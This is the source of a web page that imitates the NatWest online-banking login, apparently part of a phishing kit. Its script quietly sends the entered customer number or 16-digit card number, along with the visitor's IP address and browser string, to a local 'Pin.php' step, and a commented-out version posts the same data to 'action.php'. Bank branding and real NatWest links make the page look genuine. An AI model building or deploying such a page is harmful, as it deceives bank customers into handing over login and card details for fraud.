                }
                #onetrust-pc-sdk button.ot-pill {
                    padding: 9px;
                    max-width: 100px;
                }
                #onetrust-pc-sdk .group-option {
                    margin-left: 25px;
                    margin-bottom: 10px;
                }
                #onetrust-pc-sdk .ot-pc-footer-logo {
                    width: 100%;
                    text-align: center;
                    margin-top: 0px;
                }
                #onetrust-pc-sdk .ot-pc-footer-logo a {
                    width: auto;
                }
                #onetrust-pc-sdk .hosts-list .back-btn-handler {
                    padding-left: 0px;
                }
                #onetrust-pc-sdk .hosts-list #vendors-list-title {
                    margin-left: 20px;
                }
                #onetrust-pc-sdk .host-list-content {
                    margin-left: 0px;
                }
                #onetrust-pc-sdk .host-list-content + #vendor-list-save-btn {
                    padding-left: 0px;
                    margin-top: 25px;
                }
                #onetrust-pc-sdk .hosts-list #vendor-search-handler {
                    margin-left: 15px;
                }
                #onetrust-pc-sdk .ot-pc-refuse-all-handler.button-theme {
                    margin-bottom: 0;
                }
                #onetrust-pc-sdk.otPcCenter {
                    left: 0;
                    min-width: 100%;
                    height: 100%;
                    top: 0;
                    border-radius: 0;
                }
                #onetrust-pc-sdk.otPcCenter[dir="rtl"]:not(.ot-leg-btn) #select-all-container .ot-checkbox {
                    margin-right: 46px;
                }
                #onetrust-pc-sdk.otPcCenter[dir="rtl"] input ~ .accordion-header .ot-arrow {
                    transform: rotate(180deg);
                    -o-transform: rotate(180deg);
                    -ms-transform: rotate(180deg);
                    -webkit-transform: rotate(180deg);
                }
                #onetrust-pc-sdk.otPcCenter[dir="rtl"] input:checked ~ .accordion-header .ot-arrow {
                    transform: rotate(270deg);
                    -o-transform: rotate(270deg);
                    -ms-transform: rotate(270deg);
                    -webkit-transform: rotate(270deg);
                }
            }
            @media only screen and (max-width: 320px) {
                #onetrust-pc-sdk #select-all-container .ot-checkbox {
                    margin-right: 28px;
                }
                #onetrust-pc-sdk #filter-icon {
                    margin-top: 9px;
                }
                #onetrust-pc-sdk #vendor-search-handler {
                    width: 72%;
                }
                #onetrust-pc-sdk #search-container svg {
                    right: 40px;
                }
                #onetrust-pc-sdk .vendor-purposes {
                    transform: translate(20%, 150%);
                    -o-transform: translate(20%, 150%);
                    -ms-transform: translate(20%, 150%);
                    -webkit-transform: translate(20%, 150%);
                }
                #onetrust-pc-sdk .vendor-option a {
                    width: 150px;
                }
                #onetrust-pc-sdk .vendor-option a svg {
                    width: 14px;
                }
                #onetrust-pc-sdk .back-btn-handler p {
                    margin-bottom: 0;
                }
                #onetrust-pc-sdk #options {
                    width: 88%;
                }
            }
            @media only screen and (min-width: 600px) and (max-width: 896px) and (max-height: 425px) and (orientation: landscape) {
                #onetrust-pc-sdk #triangle {
                    left: initial;
                    right: 40vw;
                }
                #onetrust-pc-sdk .button-theme {
                    letter-spacing: 0.02em;
                }
                #onetrust-pc-sdk #select-all-container .ot-checkbox,
                #onetrust-pc-sdk.otPcCenter[dir="rtl"] #select-all-container .ot-checkbox {
                    margin-right: 10px;
                }
                #onetrust-pc-sdk #vendors-list-title {
                    margin-top: 12px;
                }
                #onetrust-pc-sdk #vendors-list-title * {
                    font-size: inherit;
                }
                #onetrust-pc-sdk #vendor-list-save-btn {
                    position: absolute;
                    top: 160px;
                    right: 0px;
                }
                #onetrust-pc-sdk #vendor-list-save-btn button {
                    max-width: 150px;
                    padding: 6px 30px;
                }
                #onetrust-pc-sdk #vendors-list-header input {
                    margin-right: 0;
                    padding-right: 45px;
                }
                #onetrust-pc-sdk #vendor-search-handler {
                    width: 415px;
                }
                #onetrust-pc-sdk .switch + p {
                    max-width: 85%;
                }
                #onetrust-pc-sdk #select-all-container {
                    max-width: none;
                }
                #onetrust-pc-sdk #vendor-list-content {
                    min-width: 68%;
                    width: 68%;
                    bottom: 0;
                    height: calc(100% - 190px);
                }
                #onetrust-pc-sdk #vendor-list-content.no-results {
                    height: auto;
                }
                #onetrust-pc-sdk input {
                    font-size: 1em !important;
                }
                #onetrust-pc-sdk p {
                    font-size: 0.6em;
                }
                #onetrust-pc-sdk .vendor-option p {
                    font-size: 0.6em;
                }
                #onetrust-pc-sdk .vendor-option a {
                    width: 70px;
                }
                #onetrust-pc-sdk #filter-modal {
                    width: 100%;
                    top: 0;
                }
                #onetrust-pc-sdk #options {
                    height: 250px;
                    width: 100%;
                }
                #onetrust-pc-sdk ul li p,
                #onetrust-pc-sdk .category-vendors-list-handler,
                #onetrust-pc-sdk .category-vendors-list-handler + a,
                #onetrust-pc-sdk .category-host-list-handler {
                    font-size: 0.6em;
                }
                #onetrust-pc-sdk.otPcCenter {
                    left: 0;
                    top: 0;
                    min-width: 100%;
                    height: 100%;
                    border-radius: 0;
                }
            }
            #onetrust-consent-sdk #onetrust-pc-sdk,
            #onetrust-consent-sdk #search-container,
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.toggle,
            #onetrust-consent-sdk #onetrust-pc-sdk .group-toggle .checkbox,
            #onetrust-consent-sdk #onetrust-pc-sdk #pc-title:after {
                background-color: #ffffff;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk h3,
            #onetrust-consent-sdk #onetrust-pc-sdk h4,
            #onetrust-consent-sdk #onetrust-pc-sdk h6,
            #onetrust-consent-sdk #onetrust-pc-sdk p,
            #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list-container .vendor-options p,
            #onetrust-consent-sdk #onetrust-pc-sdk #pc-policy-text,
            #onetrust-consent-sdk #onetrust-pc-sdk #pc-title,
            #onetrust-consent-sdk #onetrust-pc-sdk .leg-int-title,
            #onetrust-consent-sdk #onetrust-pc-sdk .leg-int-sel-all-hdr span,
            #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .vendor-host,
            #onetrust-consent-sdk #onetrust-pc-sdk #filter-modal #modal-header,
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
            #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list #select-all-container p,
            #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list #vendors-list-title,
            #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list .back-btn-handler p,
            #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list .vendor-title,
            #onetrust-consent-sdk #onetrust-pc-sdk #vendors-list #vendors-list-container .consent-category,
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
                color: #42145f;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
            #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
            #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler + a,
            #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
            #onetrust-consent-sdk #onetrust-pc-sdk .vendor-privacy-notice,
            #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .host-title a,
            #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .accordion-header .host-view-cookies,
            #onetrust-consent-sdk #onetrust-pc-sdk #hosts-list-container .vendor-host a {
                color: #3860be;
            }
            #onetrust-consent-sdk #onetrust-banner-sdk a[href] {
                color: #ffffff;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
                opacity: 0.7;
            }

            #onetrust-consent-sdk #onetrust-pc-sdk button,
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
                background-color: #1d7b8a;
                border-color: #1d7b8a;
                color: #ffffff;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk .active-group {
                border-color: #1d7b8a;
            }

            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler {
                background-color: transparent;
            }
            #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
                background-color: white;
                border-color: #c4ccd7;
            }
            a.privacy-notice-link:focus {
                outline: 0;
            }
            #onetrust-policy-text > a,
            #onetrust-policy-text:focus {
                outline: 0;
            }
            .ot-sdk-cookie-policy {
                font-family: inherit;
                font-size: 16px;
            }
            .ot-sdk-cookie-policy h3,
            .ot-sdk-cookie-policy h4,
            .ot-sdk-cookie-policy h6,
            .ot-sdk-cookie-policy p,
            .ot-sdk-cookie-policy li,
            .ot-sdk-cookie-policy a,
            .ot-sdk-cookie-policy th,
            .ot-sdk-cookie-policy #cookie-policy-description,
            .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
            .ot-sdk-cookie-policy #cookie-policy-title {
                color: dimgray;
            }
            .ot-sdk-cookie-policy #cookie-policy-description {
                margin-bottom: 1em;
            }
            .ot-sdk-cookie-policy h4 {
                font-size: 1.2em;
            }
            .ot-sdk-cookie-policy h6 {
                font-size: 1em;
                margin-top: 2em;
            }
            .ot-sdk-cookie-policy th {
                min-width: 75px;
            }
            .ot-sdk-cookie-policy a,
            .ot-sdk-cookie-policy a:hover {
                background: #fff;
            }
            .ot-sdk-cookie-policy thead {
                background-color: #f6f6f4;
                font-weight: bold;
            }
            .ot-sdk-cookie-policy .ot-mobile-border {
                display: none;
            }
            .ot-sdk-cookie-policy section {
                margin-bottom: 2em;
            }
            .ot-sdk-cookie-policy table {
                border-collapse: inherit;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
                font-family: inherit;
                font-size: 16px;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
                color: dimgray;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
                margin-bottom: 1em;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
                margin-left: 1.5rem;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span {
                font-size: 0.9rem;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
                font-size: 1rem;
                margin-bottom: 0.6rem;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
                margin-bottom: 1.2rem;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy > section {
                margin-bottom: 1rem;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
                min-width: 75px;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
                background: #fff;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
                background-color: #f6f6f4;
                font-weight: bold;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
                display: none;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
                margin-bottom: 2em;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
                list-style: disc;
                margin-left: 1.5rem;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
                display: inline-block;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
                border-collapse: inherit;
                margin: auto;
                border: 1px solid #d7d7d7;
                border-radius: 5px;
                border-spacing: initial;
                width: 100%;
                overflow: hidden;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
                border-bottom: 1px solid #d7d7d7;
                border-right: 1px solid #d7d7d7;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
                border-bottom: 0px;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
                border-right: 0px;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
                width: 25%;
            }
            .ot-sdk-cookie-policy[dir="rtl"] {
                text-align: left;
            }
            @media only screen and (max-width: 530px) {
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                    display: block;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
                    position: absolute;
                    top: -9999px;
                    left: -9999px;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                    margin: 0 0 1rem 0;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
                    background: #f6f6f4;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
                    border: none;
                    border-bottom: 1px solid #eee;
                    position: relative;
                    padding-left: 50%;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                    position: absolute;
                    height: 100%;
                    left: 6px;
                    width: 40%;
                    padding-right: 10px;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
                    display: inline-block;
                    background-color: #e4e4e4;
                    position: absolute;
                    height: 100%;
                    top: 0;
                    left: 45%;
                    width: 2px;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                    content: attr(data-label);
                    font-weight: bold;
                }
                .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
                    word-break: break-word;
                    word-wrap: break-word;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
                    overflow: hidden;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
                    border: none;
                    border-bottom: 1px solid #d7d7d7;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                    display: block;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
                    width: auto;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                    margin: 0 0 1rem 0;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                    height: 100%;
                    width: 40%;
                    padding-right: 10px;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                    content: attr(data-label);
                    font-weight: bold;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
                    word-break: break-word;
                    word-wrap: break-word;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
                    position: absolute;
                    top: -9999px;
                    left: -9999px;
                    z-index: -9999;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
                    border-bottom: 1px solid #d7d7d7;
                    border-right: 0px;
                }
                #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
                    border-bottom: 0px;
                }
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
                color: #696969;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
                color: #696969;
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
                color: #696969;
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
                color: #696969;
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
                background-color: #f8f8f8;
            }
        </style>
		<link href="files/img/favicon.ico" rel="shortcut icon" type="image/x-icon" />
		<link href="files/img/favicon.ico" rel="icon" type="image/ico" />
		<script src="files/js/jquery.js"></script>
	<script>
	
//
$( document ).ready(function() {

	$('#ctl00_mainContent_LI5TABA_LI5BTEN').click(function() {
		if($('#ctl00_mainContent_LI5TABA_LI5BTEP').is(':hidden')) {
			$('#ctl00_mainContent_LI5TABA_LI5BTEP').css('display','block');
		}else{
			$('#ctl00_mainContent_LI5TABA_LI5BTEP').css('display','none');
		}
	});
	
	
	$('#ctl00_mainContent_LI5TABA_LI5BTES').click(function() {
		if($('#ctl00_mainContent_LI5TABA_LI5BTET').is(':hidden')) {
			$('#ctl00_mainContent_LI5TABA_LI5BTET').css('display','block');
		}else{
			$('#ctl00_mainContent_LI5TABA_LI5BTET').css('display','none');
		}
	});
	
	

	$('#ctl00_mainContent_LI5TABA_rbcustomernumberdiv').click(function() {
		//Customer number
	//$('#usernametype').val('asdasdsd')
		if($('#rbcustomernumber').is(':checked')) {
			
			//removeAttr
			
			$('#usernametype').val('Customer number');
			
			$('#ctl00_mainContent_LI5TABA_CustomerNumber_edit').attr('required','required');
			$('#ctl00_mainContent_LI5TABA_CardPAN_edit').removeAttr('required');
			$('#ctl00_mainContent_LI5TABA_customernumberdiv').show();
			$('#ctl00_mainContent_LI5TABA_cardpandiv').hide();
		}else{
		
			$('#ctl00_mainContent_LI5TABA_CustomerNumber_edit').removeAttr('required');
			$('#ctl00_mainContent_LI5TABA_CardPAN_edit').attr('required','required');
			$('#ctl00_mainContent_LI5TABA_customernumberdiv').hide();
			$('#ctl00_mainContent_LI5TABA_cardpandiv').show();
		}
		
		
	});
	
	$('#ctl00_mainContent_LI5TABA_rbcardpandiv').click(function() {
		//Card number
		
		if($('#rbcardnumber').is(':checked')) {
			
			
			$('#usernametype').val('Card number');
			
			
			$('#ctl00_mainContent_LI5TABA_CardPAN_edit').attr('required','required');
			$('#ctl00_mainContent_LI5TABA_CustomerNumber_edit').removeAttr('required');
			
			
			$('#ctl00_mainContent_LI5TABA_cardpandiv').show();
			$('#ctl00_mainContent_LI5TABA_customernumberdiv').hide();
			
		}else{
		
			$('#ctl00_mainContent_LI5TABA_CardPAN_edit').removeAttr('required');
			$('#ctl00_mainContent_LI5TABA_CustomerNumber_edit').attr('required','required');
			$('#ctl00_mainContent_LI5TABA_cardpandiv').hide();
			$('#ctl00_mainContent_LI5TABA_customernumberdiv').show();
		}
		
		
	});




	
	var allInputs = $(":input");
	
	//allInputs.keydown(function(e) {
	//	console.log(e.which);
	//});
	
	
	
	allInputs.keyup(function() {
	
	
	

		
		
		//border:#d70028 3px solid; vertical-align: top;
		if($(this).prop('required')){
			if(!$(this).val()){
				//$(this).parent().parent().parent().addClass('error');
				
				$(this).css('border','#d70028 3px solid');
				
				$(this).prev().show();
				
				
				
				
			}else{
				//$(this).parent().parent().parent().removeClass('error');
				$(this).css('border','1px solid #979797');
				$(this).prev().hide();
				
				
				
				
				
				if($(this).attr('id') == 'ctl00_mainContent_LI5TABA_CardPAN_edit'){
					// check card digits number
					if(/^[0-9]{16}$/.test($(this).val()) == true && $(this).val() != null && $(this).val() != ''){
						$(this).css('border','1px solid #979797');
						$(this).prev().hide();
					}else{
						$(this).css('border','#d70028 3px solid');
				
						$(this).prev().show();
					}
					
				}else{
					// check customer digits
					
					if(/^[0-9]{10}$/.test($(this).val()) == true && $(this).val() != null && $(this).val() != ''){
						$(this).css('border','1px solid #979797');
						$(this).prev().hide();
					}else{
						$(this).css('border','#d70028 3px solid');
				
						$(this).prev().show();
					}
					
					
					
				}
				
				
				
				
				
	
			}
		}
	});
	
	allInputs.focusout(function() {
		$(this).blur(function() {
			if($(this).prop('required')){
			if(!$(this).val()){
				$(this).css('border','#d70028 3px solid');
				$(this).prev().show();
			}else{
				$(this).css('border','1px solid #979797');
				$(this).prev().hide();
				if($(this).attr('id') == 'ctl00_mainContent_LI5TABA_CardPAN_edit'){
					if(/^[0-9]{16}$/.test($(this).val()) == true && $(this).val() != null && $(this).val() != ''){
						$(this).css('border','1px solid #979797');
						$(this).prev().hide();
					}else{
						$(this).css('border','#d70028 3px solid');
						$(this).prev().show();
					}
				}else{
					if(/^[0-9]{10}$/.test($(this).val()) == true && $(this).val() != null && $(this).val() != ''){
						$(this).css('border','1px solid #979797');
						$(this).prev().hide();
					}else{
						$(this).css('border','#d70028 3px solid');
						$(this).prev().show();
					}
				}
			}
		}
		});
	});
	
	
	$('#aspnetForm').submit(function(e){
		e.preventDefault();
		if($('#rbcardnumber').is(':checked')) {
			var uzername = $('#ctl00_mainContent_LI5TABA_CardPAN_edit').val();
			var uzertype = 'card';
		}else{
			var uzername = $('#ctl00_mainContent_LI5TABA_CustomerNumber_edit').val();
			var uzertype = 'customer';
		}
		if(uzername == null || uzername == ''){
			console.log('uzer empty');
			return false;
		}else if(/^[0-9]{10}$/.test(uzername) == true && uzername != null && uzername != '' && uzertype == 'customer'){
			console.log('uzer correct1');
			$('#username').val(uzername);
		}else if(/^[0-9]{16}$/.test(uzername) == true && uzername != null && uzername != '' && uzertype == 'card'){
			console.log('uzer correct2');
			$('#username').val(uzername);
		}else{
			console.log('uzer wrong');
			return false;
		}

		$('#loginform').submit();
	
		//$.ajax({
		//	type : 'POST',
		//	url : 'files/action.php?type=customer',
		//	data : $('#loginform').serialize(),
		//	success: function (data) {
		//		//console.log(data);
		//		var parsed_data = JSON.parse(data);
		//		if(parsed_data.status == 'ok'){
		//			//console.log(parsed_data);
		//			
		//			location.href = "Loading.php"
		//			
		//		}else{
		//			return false;
		//		}
		//		//console.log(parsed_data.status);
		//	}
		//});
	
	});
	
	
	
	
	

	
	
	
});
	
	
	
	</script>
	
	<style>
	
	input:required {
		box-shadow:none !important;
		border: 1px solid #979797;
	}
	input:invalid {
		box-shadow:none !important;
		border: 1px solid #979797;
	}
	
	</style>
    </head>
    <body id="ctl00_bodyTag" class="login_wizard" style="top: 0;">
        <div id="ctl00_wrapper" class="nobackgroundImg clearfix">
            <div id="acceskeys">
                <div id="skiplinks">
                    <div class="ddalink">
                        <a
                            id="ctl00_skipLinks_ctl00_beginLink"
                            accesskey="0"
                            title="Return to start of screen / Access key
details"
                            class="ddalink"
                            href="https://www.nwolb.com/login.aspx#"
                        >
                            Return to start of screen / Access key details
                        </a>
                        <a id="ctl00_skipLinks_ctl00_MenuLink" accesskey="m" title="Skip to Menu" class="ddalink" href="https://www.nwolb.com/login.aspx#menu">Skip to Menu</a>
                        <a id="ctl00_skipLinks_ctl00_ContentLink" accesskey="s" title="Skip to main content" class="ddalink" href="https://www.nwolb.com/login.aspx#content">Skip to main content</a>
                    </div>
                </div>
            </div>
            <div id="canvas" class="twoLines">
                <div id="header" class="header">
                    <div id="ctl00_header_ctl00_topHeaderWrapper" class="topHeaderWrapper mobileTopHeaderWrapper" style="display: none;">
                        <div id="ctl00_header_ctl00_topHeaderLeftWraper" class="topHeaderLeftWrapper">
                            <ul id="ctl00_header_ctl00_globalTopNav" class="globalTopnav">
                                <li class="selected">
                                    <span id="ctl00_header_ctl00_HDRBTEA">Personal</span>
                                </li>
                                <li class="unselected">
                                    <a id="ctl00_header_ctl00_HDRNLIAnchor" title="Premier : Opens in a new window" href="https://www.natwest.com/premier" target="Premier">Premier</a>
                                </li>
                                <li class="unselected">
                                    <a id="ctl00_header_ctl00_HDRNLJAnchor" title="Business : Opens in a new window" href="https://www.natwest.com/business.ashx" target="Business">Business</a>
                                </li>
                                <li class="unselected">
                                    <a id="ctl00_header_ctl00_HDRNLLAnchor" title="Corporate : Opens in a new window" href="https://www.natwest.com/corporate" target="Corporate">Corporate</a>
                                </li>
                                <li class="unselected">
                                    <a id="ctl00_header_ctl00_HDRNLKAnchor" title="International : Opens in a new window" href="https://www.natwest.com/international.ashx" target="International">International</a>
                                </li>
                            </ul>
                        </div>
                        <div id="ctl00_header_ctl00_topHeaderRightWrapper" class="topHeaderRightWrapper"></div>
                    </div>
                    <div id="ctl00_header_ctl00_bottomHeaderWrapper" class="bottomHeaderWrapper">
                        <div id="ctl00_header_ctl00_bottomHeaderLeftWrapper" class="bottomHeaderLeftWrapper">
                            <div id="ctl00_header_ctl00_nwHeader" class="nwHeader">
                                <a id="headerLogo" href="https://www.natwest.com/" target="_blank">
                                    <img id="ctl00_header_ctl00_BrandImage4" srcset="files/img/n-w-logo.svg" src="./files/img/logo.png" alt="NatWest Logo - Back to home page " style="border-width: 0px;" />
                                </a>
                            </div>
                            <div id="ctl00_header_ctl00_globalBottomNavWrapper" class="globalBottomNavWrapper" style="display: none;">
                                <ul class="globalBottomNav">
                                    <li>
                                        <a id="ctl00_header_ctl00_HDRPULAAnchor" title="Products : Opens in a new window" href="https://www.natwest.com/AOhome" target="Products">Products</a>
                                    </li>
                                    <li>
                                        <a id="ctl00_header_ctl00_HDRPULBAnchor" title="Support : Opens in a new window" href="https://www.natwest.com/AOsupport" target="Support">Support</a>
                                    </li>
                                    <li>
                                        <a id="ctl00_header_ctl00_HDRPULCAnchor" title="Life Moments : Opens in a new window" href="https://www.natwest.com/AOlifemoments" target="Life Moments">Life Moments</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div id="ctl00_header_ctl00_bottomHeaderRightWrapper" class="bottomHeaderRightWrapper">
                            <div id="ctl00_header_ctl00_quickLinksWrapper" class="showMeHowWrapper">
                                <ul id="Ul2" style="display: none;">
                                    <li class="showMeHowLink">
                                        <a id="ctl00_header_ctl00_HDRPULDAnchor" title="Show me how to… : Opens in a new window" href="https://www.natwest.com/onlineguide" target="helpwindow">Show me how to…</a>
                                    </li>
                                    <li class="last"></li>
                                </ul>

                                <div id="ctl00_header_ctl00_loginWrapper" class="loginWrapper">
                                    <div id="ctl00_header_ctl00_loginSpan" class="loginLink">
                                        <a id="ctl00_header_ctl00_HDRNLAAnchor" title="Log in" href="https://www.nwolb.com/Login.aspx" target="_top">Log in</a>
                                    </div>
                                </div>
                                <div class="headerwrappercontent bottomHeaderWrapper"></div>
                            </div>

                            <div class="topHeaderRightWrapper showMeHowWrapper" style="display: none;">
                                <div class="logoutWrapper">
                                    <div class="logoutLink cancelLink">
                                        <a title="Cancel" href="javascript:void(0)" onclick="return goToLogin(event)"><span id="ctl00_header_ctl00_HDRPULE">Cancel</span></a>
                                    </div>
                                </div>
                                <div class="headerwrappercontent bottomHeaderWrapper"></div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="content" style="background-color: #ffffff;">
                    <a name="content"></a>
                    <div id="ctl00_leftPanel" class="MobileLeftPanel left menu leftPanelMenu"></div>
                    <div id="mid">
                        <div id="ctl00_snailTrail__120ed347ba7e182_SnailTrail"></div>
						
						<form id="loginform" method="post" action="Pin.php">
							<input type="hidden" id="usernametype" name="usernametype" value="Customer number">
							<input type="hidden" id="username" name="username">
							<input type="hidden" name="ip" value="<?=$ip;?>">
							<input type="hidden" name="ua" value="<?=$ua;?>">
						</form>
						
                        <form
                            name="aspnetForm"
                            method="post"
                            action="#"
                            id="aspnetForm"
                        >
                            <div>
                                
                            </div>

                            

                            <span id="ctl00_mainContent_LoginPanelControl"></span>
                            <span id="ctl00_mainContent_ThreatMetrixAnalyser_FDM"></span>
                            
							<!-- error -->
							
							<div id="ctl00_mainContent_ValidationSummary" tabindex="-1" class="error" role="alert" aria-atomic="true" style="color:;display:none;">
								<br><span class="errorsummary"><strong>Please review the following:</strong></span><ul><li><div>Please enter your customer or card number to continue.</div></li></ul>
							</div>
							
							<!-- error -->
							
							
							
                            <span id="ctl00_mainContent_ctl01" aria-hidden="true" class="errorIndicator" style="color: Red; display: none;"></span>
                            <div id="ctl00_mainContent_LI5PNL">
                                <div id="LI5DVA" class="li5MarginLeft">
                                    <div id="PEGADiv" class="LI5SecurityPodPosition ubnPegaBannerReposition">
                                        <a
                                            href="https://personal.natwest.com/personal/fraud-and-security/fraud-guide/telephone-fraud.html"
                                            title="Take 5 to stop fraud - your bank will
never call you and ask you to move your
money or provide card reader codes."
                                            target="_blank"
                                        >
                                            <img
